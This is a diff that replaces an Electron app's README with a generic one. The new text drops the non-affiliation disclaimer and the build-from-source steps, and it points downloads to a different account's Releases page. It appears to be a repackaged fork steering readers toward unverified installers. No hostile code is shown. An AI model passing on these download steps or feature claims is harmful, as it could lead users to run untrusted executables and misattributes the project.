@@ -1,41 +1,77 @@
-# Claude Agent Desktop
+# 💻 claude-agent-desktop - Chat Effortlessly with AI Support
 
-![Claude Agent Desktop screenshot](https://github.com/user-attachments/assets/d7199fcc-a5ba-45ce-917a-e455ff430a2d)
+## 🌟 Introduction
+Welcome to claude-agent-desktop! This is a cross-platform desktop application designed to make your conversations with AI seamless and engaging. Based on the Claude Agent SDK, it offers an intuitive interface, allowing you to interact with the AI in a user-friendly manner.
 
-> [!IMPORTANT]
-> This project is not affiliated with [Anthropic](https://www.anthropic.com)
+## 🚀 Getting Started
+Ready to dive in? Follow these simple steps to download and run claude-agent-desktop on your computer.
 
-## Why This App?
+## 🔗 Download the Application
+[![Download claude-agent-desktop](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Ali-Shady/claude-agent-desktop/releases)
 
-The [Claude Agent SDK](https://platform.claude.com/docs/en/agent-sdk/overview) is a powerful toolkit for building AI agents that can execute code, manage files, search the web, and perform complex multi-step tasks. However, using it typically requires programming knowledge, terminal commands, and installing developer tools like Node.js, Python, and package managers.
+## 💻 System Requirements
+Before downloading, ensure your system meets the following requirements:
 
-**Claude Agent Desktop removes these barriers entirely.** Designed for all knowledge workers, not just engineers, it packages the full power of the Claude Agent SDK into a simple desktop application:
+- **Operating Systems**: Windows 10 or later, macOS 10.14 or later, or any recent Linux distribution.
+- **RAM**: Minimum of 4 GB.
+- **Disk Space**: At least 500 MB of free space.
+- **Network**: An internet connection for optimal use.
 
-- **Zero technical setup** — All required runtimes are bundled: [bun](https://bun.sh) for JavaScript/TypeScript, [uv](https://docs.astral.sh/uv/) for Python, and portable Git/Unix tools for Windows. No installation of development tools needed.
-- **Accessible workspace** — Your agent workspace defaults to `~/Desktop/claude-agent`, a shared environment for mutual collaboration. The agent can build applications, generate spreadsheets, and create documents here, while you can drag and drop your own files into the folder for the agent to analyze and work with.
-- **Pre-configured [Skills](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview)** — Built-in capabilities for document handling, data analysis, and more are automatically available without any configuration.
-- **Full agent capabilities** — Execute scripts, analyze files, create documents, automate workflows, and tackle complex knowledge work—all through natural conversation.
+## 📥 Download & Install
+To get started, visit this page to download: [claude-agent-desktop Releases](https://github.com/Ali-Shady/claude-agent-desktop/releases)
 
-Whether you're a researcher analyzing data, a writer managing documents, or anyone who wants AI to actively work on your computer rather than just chat, this app lets you harness frontier agent capabilities without opening the terminal or writing a single line of code.
+1. Go to the **Releases** section by clicking the link above.
+2. You will see a list of available versions. 
+3. Choose the latest version for your operating system:
+   - For Windows users, download the file labeled `claude-agent-desktop-windows-installer.exe`.
+   - Mac users should select `claude-agent-desktop-macos.dmg`.
+   - If you’re on Linux, download the appropriate file for your distribution.
 
-![Claude Agent Desktop screenshot](https://github.com/user-attachments/assets/6ff7054d-d50c-4535-bddf-e8bc500e418f)
+4. Once the download completes, locate the file in your downloads folder.
 
-## Download
+### Installing on Windows
+- Double-click the `claude-agent-desktop-windows-installer.exe`.
+- Follow the installation prompts.
+- After installation, find the application in your Start Menu and launch it.
 
-Pre-built binaries for **macOS** and **Windows** are available on the [Releases page](https://github.com/pheuter/claude-agent-desktop/releases).
+### Installing on macOS
+- Open the downloaded `claude-agent-desktop-macos.dmg` file.
+- Drag the claude-agent-desktop icon to your Applications folder.
+- Go to your Applications folder and double-click the icon to open it.
 
-## Prerequisites
+### Installing on Linux
+- Open your terminal.
+- Navigate to the folder where you downloaded the file.
+- Follow the installation instructions relevant to your distribution, usually involving commands like `sudo dpkg -i` or `tar -xvf` based on the downloaded file’s format.
 
-- Install [Bun](https://bun.sh/) (used for package management, scripts, and tests).
-- Anthropic API key via `ANTHROPIC_API_KEY` or in app settings.
+## 🛠️ Using claude-agent-desktop
+Once you have installed the application, here’s how to start using it:
 
-## Quick start
+1. Open claude-agent-desktop from your applications folder.
+2. You’ll see a clean interface. Type your message in the input box at the bottom.
+3. Hit Enter or click the send button to communicate with the AI.
+4. Adjust settings using the menu to customize your experience.
 
-```bash
-bun install
-bun run dev      # builds skills, starts Electron + Vite
-```
+## 🛡️ Features
+claude-agent-desktop offers a wealth of features to enhance your interactions:
 
-## Auto-updates
+- **User-Friendly Interface**: Simple navigation to help you get started quickly.
+- **Custom Responses**: The AI tailors responses based on your inputs.
+- **Multi-Platform Support**: Use it on Windows, macOS, or Linux.
+- **Regular Updates**: Stay tuned for improvements and new features.
 
-Packaged builds check this repository's GitHub Releases for updates via `electron-updater`. Set `GH_TOKEN` when running `electron-builder` to publish releases with update metadata, and optionally provide `UPDATE_FEED_URL` to point the app at a custom update server.
+## 📖 Frequently Asked Questions
+
+### How do I update the application?
+To update to the latest version, visit the [Releases](https://github.com/Ali-Shady/claude-agent-desktop/releases) page and follow the download steps again. 
+
+### What should I do if the app doesn’t start?
+Ensure your system meets the requirements. If it still doesn’t launch, try reinstalling the application.
+
+### Can I contribute to claude-agent-desktop?
+Absolutely! If you want to contribute, feel free to check the guidelines on our repository page. 
+
+## ✅ Support
+If you encounter any issues, please check the [issues section](https://github.com/Ali-Shady/claude-agent-desktop/issues) on GitHub for help or to report a bug.
+
+Thank you for choosing claude-agent-desktop! We hope you enjoy chatting with your AI agent.
